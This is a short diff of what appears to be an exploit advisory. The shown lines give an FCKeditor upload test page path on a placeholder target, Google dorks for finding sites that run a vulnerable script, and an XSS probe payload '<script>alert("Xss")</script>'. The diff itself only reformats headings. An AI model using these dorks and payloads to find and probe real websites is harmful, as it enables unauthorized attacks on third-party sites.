@@ -12,9 +12,7 @@ target.com/jscripts/FCKeditor/editor/filemanager/upload/test.html
 
 xss : cross site scripting
 
-####
-
-Dork :
+#### Dork :
 
 inurl:"/showcatrows.php?CategoryID="
 
@@ -22,9 +20,9 @@ inurl:"/showcatrows.php?CategoryID="
 
 Search Site And Add This Xss Dork <script>alert("Xss")</script>
 
-####
 
-Dork : 
+
+#### Dork : 
 
 intext:dokumenary.net
 
